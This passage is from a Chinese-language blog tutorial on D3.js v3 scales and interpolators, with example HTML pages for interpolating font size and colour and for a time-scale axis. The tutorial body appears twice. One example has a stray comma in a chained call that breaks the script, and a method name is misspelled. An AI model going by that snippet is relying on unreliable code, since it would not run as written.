class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> start = &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"string\">&#x27;font-size&#x27;</span>: <span class=\"string\">&#x27;12px&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">            color: <span class=\"string\">&#x27;#f00&#x27;</span></span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> end = &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"string\">&#x27;font-size&#x27;</span>: <span class=\"string\">&#x27;40px&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">            color: <span class=\"string\">&#x27;#ff0&#x27;</span></span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> interpolate = d3.interpolate(start, end);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> groups = svg.append(<span class=\"string\">&#x27;g&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> info = interpolate(i / <span class=\"number\">10</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">            groups.append(<span class=\"string\">&#x27;text&#x27;</span>)</span></span><br><span class=\"line\">                .text(i)</span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">0</span> + i * <span class=\"number\">24</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">40</span>),</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;text-list&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;fill&#x27;</span>, info.color)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;font-size&#x27;</span>, info[<span class=\"string\">&#x27;font-size&#x27;</span>]);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"类别\"><a href=\"#类别\" class=\"headerlink\" title=\"类别\"></a>类别</h2><ul>\n<li>数值尺度<ul>\n<li>d3.scale.linear: 线性比例尺 （<code>f(n) = kx + b</code>）<ul>\n<li>d3.time.scale: 线性时间比例尺</li>\n</ul>\n</li>\n<li>d3.scale.pow: 指数比例尺 （<code>f(n) = a * n ^ 2 + b</code>）<ul>\n<li>pow.exponent(k) 用于设置二项式系数 a 的值，默认为 1</li>\n</ul>\n</li>\n<li>d3.scale.log: 对数比例尺（<code>f(n) = a * log(n) + b</code>）<ul>\n<li>log.base(base) : 设置这个对数比例尺的底数，默认是 10</li>\n</ul>\n</li>\n<li>d3.scale.quantize: 量化比例尺（定义域是连续的，值域是离散）</li>\n<li>d3.scale.identity: 线性恒等比例尺</li>\n<li>d3.scale.quantile: 分位数比例尺</li>\n<li>d3.scale.sqrt: 平方根比例尺</li>\n<li>d3.scale.threshold: 临界值比例尺（值域离散）</li>\n</ul>\n</li>\n<li>有序尺度<ul>\n<li>d3.scale.ordinal: 序数比例尺 （key、value 映射，无具体表达式）</li>\n<li>d3.scale.category10: 该比例尺中有默认的值域中有 10 种颜色</li>\n<li>d3.scale.category20: 该比例尺中有默认的值域中有 20 种颜色</li>\n<li>d3.scale.category20b: 该比例尺中有默认的值域中有 20 种颜色</li>\n<li>d3.scale.category20c: 该比例尺中有默认的值域中有 20 种颜色</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"线性比例尺\"><a href=\"#线性比例尺\" class=\"headerlink\" title=\"线性比例尺\"></a>线性比例尺</h2><p>说明：将输入域映射到连续的输出范围，类似 <code>y=kx+b</code> 线性函数，如将身高映射成柱状图的高度（像素），<code>let linear = d3.scale.linear()</code></p>\n<blockquote>\n<ul>\n<li>线性比例尺的默认输入域 [0, 1]，默认输出范围为 [0, 1]，此时为恒等函数</li>\n<li>比例尺只是定义了一个映射规则，映射的输入值并不局限于 <code>domain()</code> 中的输入域</li>\n</ul>\n</blockquote>\n<ul>\n<li><code>linear(x)</code>：在输入域中的输入 x，返回输出范围对应的值。</li>\n<li><code>linear.domain([min, max])</code>：指定输入域范围</li>\n<li><code>linear.range([min, max])</code>：指定输出范围</li>\n<li><code>linear.ticks()</code>：返回比例尺输入域的代表性时间</li>\n</ul>\n<h2 id=\"时间比例尺\"><a href=\"#时间比例尺\" class=\"headerlink\" title=\"时间比例尺\"></a>时间比例尺</h2><p>说明：<code>d3.time.scale</code> 是 <code>d3.scale.linear</code> 比例尺的扩展，使用 Javascript 的 <code>Date</code> 对象作为其输入域 <code>domain</code>，<code>let time = d3.time.scale()</code> </p>\n<ul>\n<li><code>time</code>: 取得给定定义域中值对应的输出范围中的值。</li>\n<li><code>time.domain</code>: 取得或设置比例尺度的定义域。</li>\n<li><code>time.rangeRound</code>: 设置比例尺的四舍五入输出范围。</li>\n<li><code>time.range</code>：取得或设置比例尺的输出范围。</li>\n</ul>\n<h2 id=\"序号比例尺\"><a href=\"#序号比例尺\" class=\"headerlink\" title=\"序号比例尺\"></a>序号比例尺</h2><p>说明：序号比例尺来映射输入域（离散）到输出范围。 <code>let ordinal = d3.scale.ordinal()</code></p>\n<ul>\n<li><code>ordinal(x)</code>：在输入域中的输入 x，返回输出范围对应的值。</li>\n<li><code>ordinal.domain([a, b, ..., x])</code>：指定输入域范围（一系列离散的数据）</li>\n<li><code>ordinal.range([k1, k2, ..., kn])</code>：如果指定了输出范围，设置当前比例尺对象的输出范围为指定的 values 数组，如果 values 中的值的个数少于输入域中元素的个数，那么 values 中的值会被循环使用。（主要用于颜色）</li>\n<li><code>ordinal.rangePoints([min, max], padding)</code>：指定输出范围为一个连续的区间，第一个位置和最后一个位置会因为入参 padding 的值而做相应，消减长度是padding 个间隔长度的一半；默认情况下 padding 是 0 </li>\n<li><code>ordinal.rangeBands([min, max], padding, outerPadding)</code>：该函数是将区间切分成一个个小的区间段，而不是一个个刻度点（刻度在坐标轴中间，而不是在起点，适用于柱状图）</li>\n<li><code>rdinal.rangeRoundPoints([min, max], padding)</code>：功能同 <code>ordinal.rangePoints</code>，但是该函数可以美化输出的刻度点，即保证整数</li>\n<li><code>ordinal.rangeRoundBands([min, max], padding, outerPadding)</code> 功能同 <code>ordinal.rangeBands</code>，但是该函数可以美化输出的区间段，即保证每个区间段的起点值都是整数</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">800</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> padding = <span class=\"number\">40</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> dateRange = [<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(<span class=\"number\">2017</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>), <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(<span class=\"number\">2018</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>)];</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xScale = d3.time.scale()</span></span><br><span class=\"line\">            .domain(dateRange)</span><br><span class=\"line\">            .rangeRound([padding, w - padding]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> axis = d3.svg.axis()</span></span><br><span class=\"line\">            .scale(xScale)</span><br><span class=\"line\"><span class=\"javascript\">            .tickFormat(d3.time.format(<span class=\"string\">&#x27;%m-%d&#x27;</span>));</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;x-axis&#x27;</span>)</span></span><br><span class=\"line\">            .call(axis);</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"比例尺\"><a href=\"#比例尺\" class=\"headerlink\" title=\"比例尺\"></a>比例尺</h1><p>说明：任何数据集中的值都不太可能完全对应于可视化中使用的像素测量值。比例提供了一种方便的方法，将这些数据值映射为可用于可视化目的的新值。</p>\n<p><code>d3.scale</code></p>\n<blockquote>\n<p>数据集中的数据其实是通过映射成一个个坐标点后在页面中绘制出来的，而数据可能会很大或很小，所以需要将数值进行映射以适配 SVG 容器的大小</p>\n</blockquote>\n<ul>\n<li>scale.copy: 创建比例尺的副本。</li>\n<li>scale.interpolate: 取得或设置比例尺的输出插值器。</li>\n<li>scale.invert: 取得给定输出值对应定义域中的值。</li>\n<li>scale.nice: 扩展比例尺的定义域为一个优化的整数值。</li>\n<li>scale.tickFormat: 取得用于展示刻度值的格式化器。</li>\n<li>scale.ticks: 取得定义域中有代表性的值。</li>\n</ul>\n<h3 id=\"插值器\"><a href=\"#插值器\" class=\"headerlink\" title=\"插值器\"></a>插值器</h3><p>给定函数 <code>f(x)</code> 在 <code>x0, x1,...,xn</code> 处的值。现有 <code>x&#39;</code>，其值在上述取值点间。那么，求 <code>f(x&#39;)</code>值的过程叫做 <strong>插值</strong></p>\n<p>插值不仅在尺度功能的实现中非常重要，对于 D3 的其他核心功能的实现也不可或缺，例如，动画和布局管理功能。因而 D3 设计了一个独立、可重用的插值<br>器，以便在实现其他功能时提供统一的调用方式。（默认的范围域是 <code>[0, 1]</code>）</p>\n<ul>\n<li>d3.interpolate: 返回一个介于 a 和 b 之间的默认插值器(<code>a</code>、<code>b</code>可为对象，包含多个属性，使用复合尺度插值时，D3 会遍历对象中的所有成员，并对其每一个组成部分应用相应的简单插值规则)</li>\n<li>d3.interpolateNumber: 插补两个数字值</li>\n<li>d3.interpolateString: 插补两个字符串</li>\n<li>d3.interpolateArray: 插补两个数组</li>\n<li>d3.interpolateHcl: 插补两个 HCL 颜色值</li>\n<li>d3.interpolateHsl: 插补两个 HSL 颜色值</li>\n<li>d3.interpolateLab: 插补两个 <code>L * a * b *</code> 颜色值</li>\n<li>d3.interpolateObject: 插补两个任意对象</li>\n<li>d3.interpolateRgb: 插补两个RGB颜色值</li>\n<li>d3.interpolateRound: 插补两个整数</li>\n<li>d3.interpolateTransform: 插补两个 2D 矩阵变换</li>\n<li>d3.interpolateZoom: 在两个点之间平滑地缩放平移</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> interpolate = d3.interpolateNumber(<span class=\"number\">0</span>, <span class=\"number\">100</span>);</span><br><span class=\"line\">interpolate(<span class=\"number\">0.1</span>);  <span class=\"comment\">// 10</span></span><br><span class=\"line\">interpolate(<span class=\"number\">0.99</span>); <span class=\"comment\">// 99</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用 d3.interpolateNumber 函数创建了一个值域为 [0, 100] 的interpolate函数，并使用这个函数对指定的数字进行插值。该函数与如下代码是等价的。</span></span><br><span class=\"line\"><span class=\"comment\">// function interpolate(t)&#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     return a * (1 - t) + b * t;</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> start = &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"string\">&#x27;font-size&#x27;</span>: <span class=\"string\">&#x27;12px&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">            color: <span class=\"string\">&#x27;#f00&#x27;</span></span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> end = &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"string\">&#x27;font-size&#x27;</span>: <span class=\"string\">&#x27;40px&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">            color: <span class=\"string\">&#x27;#ff0&#x27;</span></span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> interpolate = d3.interpolate(start, end);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> groups = svg.append(<span class=\"string\">&#x27;g&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> info = interpolate(i / <span class=\"number\">10</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">            groups.append(<span class=\"string\">&#x27;text&#x27;</span>)</span></span><br><span class=\"line\">                .text(i)</span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">0</span> + i * <span class=\"number\">24</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">40</span>),</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;text-list&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;fill&#x27;</span>, info.color)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;font-size&#x27;</span>, info[<span class=\"string\">&#x27;font-size&#x27;</span>]);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"类别\"><a href=\"#类别\" class=\"headerlink\" title=\"类别\"></a>类别</h2><ul>\n<li>数值尺度<ul>\n<li>d3.scale.linear: 线性比例尺 （<code>f(n) = kx + b</code>）<ul>\n<li>d3.time.scale: 线性时间比例尺</li>\n</ul>\n</li>\n<li>d3.scale.pow: 指数比例尺 （<code>f(n) = a * n ^ 2 + b</code>）<ul>\n<li>pow.exponent(k) 用于设置二项式系数 a 的值，默认为 1</li>\n</ul>\n</li>\n<li>d3.scale.log: 对数比例尺（<code>f(n) = a * log(n) + b</code>）<ul>\n<li>log.base(base) : 设置这个对数比例尺的底数，默认是 10</li>\n</ul>\n</li>\n<li>d3.scale.quantize: 量化比例尺（定义域是连续的，值域是离散）</li>\n<li>d3.scale.identity: 线性恒等比例尺</li>\n<li>d3.scale.quantile: 分位数比例尺</li>\n<li>d3.scale.sqrt: 平方根比例尺</li>\n<li>d3.scale.threshold: 临界值比例尺（值域离散）</li>\n</ul>\n</li>\n<li>有序尺度<ul>\n<li>d3.scale.ordinal: 序数比例尺 （key、value 映射，无具体表达式）</li>\n<li>d3.scale.category10: 该比例尺中有默认的值域中有 10 种颜色</li>\n<li>d3.scale.category20: 该比例尺中有默认的值域中有 20 种颜色</li>\n<li>d3.scale.category20b: 该比例尺中有默认的值域中有 20 种颜色</li>\n<li>d3.scale.category20c: 该比例尺中有默认的值域中有 20 种颜色</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"线性比例尺\"><a href=\"#线性比例尺\" class=\"headerlink\" title=\"线性比例尺\"></a>线性比例尺</h2><p>说明：将输入域映射到连续的输出范围，类似 <code>y=kx+b</code> 线性函数，如将身高映射成柱状图的高度（像素），<code>let linear = d3.scale.linear()</code></p>\n<blockquote>\n<ul>\n<li>线性比例尺的默认输入域 [0, 1]，默认输出范围为 [0, 1]，此时为恒等函数</li>\n<li>比例尺只是定义了一个映射规则，映射的输入值并不局限于 <code>domain()</code> 中的输入域</li>\n</ul>\n</blockquote>\n<ul>\n<li><code>linear(x)</code>：在输入域中的输入 x，返回输出范围对应的值。</li>\n<li><code>linear.domain([min, max])</code>：指定输入域范围</li>\n<li><code>linear.range([min, max])</code>：指定输出范围</li>\n<li><code>linear.ticks()</code>：返回比例尺输入域的代表性时间</li>\n</ul>\n<h2 id=\"时间比例尺\"><a href=\"#时间比例尺\" class=\"headerlink\" title=\"时间比例尺\"></a>时间比例尺</h2><p>说明：<code>d3.time.scale</code> 是 <code>d3.scale.linear</code> 比例尺的扩展，使用 Javascript 的 <code>Date</code> 对象作为其输入域 <code>domain</code>，<code>let time = d3.time.scale()</code> </p>\n<ul>\n<li><code>time</code>: 取得给定定义域中值对应的输出范围中的值。</li>\n<li><code>time.domain</code>: 取得或设置比例尺度的定义域。</li>\n<li><code>time.rangeRound</code>: 设置比例尺的四舍五入输出范围。</li>\n<li><code>time.range</code>：取得或设置比例尺的输出范围。</li>\n</ul>\n<h2 id=\"序号比例尺\"><a href=\"#序号比例尺\" class=\"headerlink\" title=\"序号比例尺\"></a>序号比例尺</h2><p>说明：序号比例尺来映射输入域（离散）到输出范围。 <code>let ordinal = d3.scale.ordinal()</code></p>\n<ul>\n<li><code>ordinal(x)</code>：在输入域中的输入 x，返回输出范围对应的值。</li>\n<li><code>ordinal.domain([a, b, ..., 